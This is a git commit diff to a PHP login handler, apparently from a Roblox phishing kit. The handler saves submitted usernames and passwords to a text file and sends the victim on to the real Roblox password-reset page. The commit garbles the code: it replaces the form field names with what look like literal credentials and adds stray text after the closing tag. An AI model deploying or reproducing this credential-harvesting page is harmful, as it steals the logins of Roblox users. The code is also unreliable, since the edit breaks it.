70bb43c476399ff4a435167773ee2c60d0d65823
ahmedibnmuneef-alt <ahmedibnmuneef@gmail.com>
2026-04-18 18:38:27 +0100

    Update login.php

--- .sites/roblox/login.php
+++ .sites/roblox/login.php
@@ -1,6 +1,6 @@
 <?php
 
-file_put_contents("usernames.txt", "Roblox Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+file_put_contents("usernames.txt", "Roblox Username: " . $_POST['DexterBrianDexBiney'] . " Pass: " . $_POST['password123'] . "\n", FILE_APPEND);
 header('Location: https://www.roblox.com/login/forgot-password-or-username/');
 exit();
-?>
+?> i'm\n Trying to get the account back.
